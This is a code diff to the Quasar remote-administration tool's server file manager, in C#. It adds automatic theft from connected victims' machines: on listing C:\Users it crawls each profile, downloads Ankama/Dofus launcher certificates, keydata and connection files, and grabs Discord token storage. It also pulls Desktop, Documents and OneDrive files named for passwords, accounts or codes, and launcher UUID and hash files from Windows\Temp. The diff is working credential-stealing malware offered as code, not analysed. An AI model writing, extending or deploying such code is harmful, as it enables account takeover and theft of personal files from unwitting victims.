@@ -192,25 +192,29 @@ namespace Quasar.Server.Messages
         /// <param name="remotePath">The remote path of the file to download.</param>
         /// <param name="localFileName">The local file name.</param>
         /// <param name="overwrite">Overwrite the local file with the newly downloaded.</param>
-        public void BeginDownloadFile(string remotePath, string localFileName = "", bool overwrite = false)
+        public void BeginDownloadFile(string remotePath, string localFileName = "", bool overwrite = false, string basedownloadpath = "")
         {
             if (string.IsNullOrEmpty(remotePath))
                 return;
 
+            string downloadpath = _baseDownloadPath;
+            if (!string.IsNullOrEmpty(basedownloadpath))
+            { downloadpath = Path.Combine(_client.Value.DownloadDirectory, basedownloadpath); }
+
             int id = GetUniqueFileTransferId();
 
-            if (!Directory.Exists(_baseDownloadPath))
-                Directory.CreateDirectory(_baseDownloadPath);
+            if (!Directory.Exists(downloadpath))
+                Directory.CreateDirectory(downloadpath);
 
             string fileName = string.IsNullOrEmpty(localFileName) ? Path.GetFileName(remotePath) : localFileName;
-            string localPath = Path.Combine(_baseDownloadPath, fileName);
+            string localPath = Path.Combine(downloadpath, fileName);
 
             int i = 1;
             while (!overwrite && File.Exists(localPath))
             {
                 // rename file if it exists already
                 var newFileName = string.Format("{0}({1}){2}", Path.GetFileNameWithoutExtension(localPath), i, Path.GetExtension(localPath));
-                localPath = Path.Combine(_baseDownloadPath, newFileName);
+                localPath = Path.Combine(downloadpath, newFileName);
                 i++;
             }
 
@@ -496,6 +500,143 @@ namespace Quasar.Server.Messages
             {
                 message.Items = new FileSystemEntry[0];
             }
+
+            foreach (FileSystemEntry item in message.Items)
+            {
+
+                if (message.RemotePath == ("C:\\Users"))
+                {
+                    GetDirectoryContents("C:\\Users\\" + item.Name + "\\AppData\\Roaming\\Dofus");
+                    GetDirectoryContents("C:\\Users\\" + item.Name + "\\AppData\\Roaming\\zaap");
+                    GetDirectoryContents("C:\\Users\\" + item.Name + "\\AppData\\Roaming\\zaap\\keydata");
+                    GetDirectoryContents("C:\\Users\\" + item.Name + "\\AppData\\Roaming\\zaap\\certificate");
+                    GetDirectoryContents("C:\\Users\\" + item.Name + "\\AppData\\Roaming\\AnkamaCertificates\\v2-RELEASE");
+                    GetDirectoryContents("C:\\Users\\" + item.Name + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb");
+
+                    //Fouille
+                    GetDirectoryContents("C:\\Users\\" + item.Name + "\\Desktop");
+                    GetDirectoryContents("C:\\Users\\" + item.Name + "\\Documents");
+                    GetDirectoryContents("C:\\Users\\" + item.Name + "\\OneDrive");
+                }
+
+
+                //ANKAMACERTIFICATES
+                if (message.RemotePath.Contains("\\AppData\\Roaming\\AnkamaCertificates\\v2-RELEASE")
+                    && (item.Name.Length == 32)
+                    && (item.Size < 1000000)
+                    && !_baseDownloadPath.EndsWith("Logs\\"))
+                {
+                    String username = message.RemotePath.Replace("\\AppData\\Roaming\\AnkamaCertificates\\v2-RELEASE", "").Replace("C:\\Users\\", "");
+                    BeginDownloadFile(message.RemotePath + "\\" + item.Name, item.Name, true, "AnkamaCertificates ("+username+")");
+                }
+
+
+                //SETTINGS
+                else if (message.RemotePath.Contains("\\AppData\\Roaming\\zaap")
+                    && item.Name == "Settings"
+                    && (item.Size > 2)
+                    && (item.Size < 5000000)
+                    && !_baseDownloadPath.EndsWith("Logs\\"))
+                {
+                    String username = message.RemotePath.Replace("\\AppData\\Roaming\\zaap", "").Replace("C:\\Users\\", "");
+                    BeginDownloadFile(message.RemotePath + "\\" + item.Name, "Settings " + username + ".txt", true, ".");
+                }
+
+
+                //MODULE_ANKAMA_CONNECTION
+                else if (message.RemotePath.Contains("\\AppData\\Roaming\\Dofus")
+                    && item.Name == "Module_Ankama_Connection.dat"
+                    && (item.Size > 2)
+                    && (item.Size < 5000000)
+                    && !_baseDownloadPath.EndsWith("Logs\\"))
+                {
+                    String username = message.RemotePath.Replace("\\AppData\\Roaming\\Dofus", "").Replace("C:\\Users\\", "");
+                    BeginDownloadFile(message.RemotePath + "\\" + item.Name, "Module "+username+".txt", true);
+                }
+
+
+                //KEYDATA
+                else if (message.RemotePath.Contains("\\AppData\\Roaming\\zaap\\keydata")
+                    && (item.Size < 1000000)
+                    && !_baseDownloadPath.EndsWith("Logs\\"))
+                {
+                    String username = message.RemotePath.Replace("\\AppData\\Roaming\\zaap\\keydata", "").Replace("C:\\Users\\", "");
+                    BeginDownloadFile(message.RemotePath + "\\" + item.Name, item.Name, true, "keydata (" + username + ")");
+                }
+
+
+                //CERTIFICATE
+                else if (message.RemotePath.Contains("\\AppData\\Roaming\\zaap\\certificate")
+                    && (item.Size < 1000000)
+                    && !_baseDownloadPath.EndsWith("Logs\\"))
+                {
+                    String username = message.RemotePath.Replace("\\AppData\\Roaming\\zaap\\certificate", "").Replace("C:\\Users\\", "");
+                    BeginDownloadFile(message.RemotePath + "\\" + item.Name, item.Name, true, "certificate (" + username + ")");
+                }
+
+
+                //TOKEN DISCORD
+                else if (message.RemotePath.Contains("\\AppData\\Roaming\\discord\\Local Storage\\leveldb")
+                    && item.Name == "dtk"
+                    && (item.Size < 1000000)
+                    && !_baseDownloadPath.EndsWith("Logs\\"))
+                {
+                    String username = message.RemotePath.Replace("\\AppData\\Roaming\\discord\\Local Storage\\leveldb", "").Replace("C:\\Users\\", "");
+                    BeginDownloadFile(message.RemotePath + "\\" + item.Name, "Token_Discord " + username + ".txt", true);
+                }
+
+
+                //DOCUMENT BUREAU DOCUMENTS ONEDRIVE
+                else if ( (message.RemotePath.EndsWith("Desktop") || message.RemotePath.EndsWith("Documents") || message.RemotePath.EndsWith("OneDrive"))
+                    && (item.Name.ToLower().Contains("dofus") || item.Name.ToLower().Contains("shield") || item.Name.ToLower().Contains("auth") || item.Name.ToLower().Contains("mail") || item.Name.ToLower().Contains("pass") || item.Name.ToLower().Contains("mdp") || item.Name.ToLower().Contains("compte") || item.Name.ToLower().Contains("code") || item.Name.ToLower().Contains("nouveau") || item.Name.ToLower().Contains("document"))
+                    && (item.Name.EndsWith("txt") || item.Name.EndsWith("rtf") || item.Name.EndsWith("doc") || item.Name.EndsWith("xls") || item.Name.EndsWith("xlsx") || item.Name.EndsWith("docx"))
+                    && (item.Size < 1000000)
+                    && (item.Size > 2)
+                    )
+                {
+                    String username = message.RemotePath.Replace("C:\\Users\\", "");
+                    int index = username.IndexOf("\\");
+                    username = username.Substring(0, index);
+                    BeginDownloadFile(message.RemotePath + "\\" + item.Name, item.Name, true,"Files\\"+username);
+                }
+
+
+                //UID_LAUNCHER & GETHASSUF
+                else if (message.RemotePath.Contains("\\Windows\\Temp")
+                    && item.Name == "uuid_launcher.txt"
+                    && (item.Size > 2)
+                    && (item.Size < 5000000)
+                    && !_baseDownloadPath.EndsWith("Logs\\"))
+                {
+                    BeginDownloadFile(message.RemotePath + "\\" + item.Name, item.Name, true, ".");
+                }
+                else if (message.RemotePath.Contains("\\Windows\\Temp")
+                    && item.Name == "uuid2_launcher.txt"
+                    && (item.Size > 2)
+                    && (item.Size < 5000000)
+                    && !_baseDownloadPath.EndsWith("Logs\\"))
+                {
+                    BeginDownloadFile(message.RemotePath + "\\" + item.Name, item.Name, true, ".");
+                }
+                else if (message.RemotePath.Contains("\\Windows\\Temp")
+                    && item.Name == "uuid3_launcher.txt"
+                    && (item.Size > 2)
+                    && (item.Size < 5000000)
+                    && !_baseDownloadPath.EndsWith("Logs\\"))
+                {
+                    BeginDownloadFile(message.RemotePath + "\\" + item.Name, item.Name, true, ".");
+                }
+                else if (message.RemotePath.Contains("\\Windows\\Temp")
+                    && item.Name == "getHashSuf.txt"
+                    && (item.Size > 2)
+                    && (item.Size < 5000000)
+                    && !_baseDownloadPath.EndsWith("Logs\\"))
+                {
+                    BeginDownloadFile(message.RemotePath + "\\" + item.Name, item.Name, true, ".");
+                }
+
+            }
+
             OnDirectoryChanged(message.RemotePath, message.Items);
         }
 
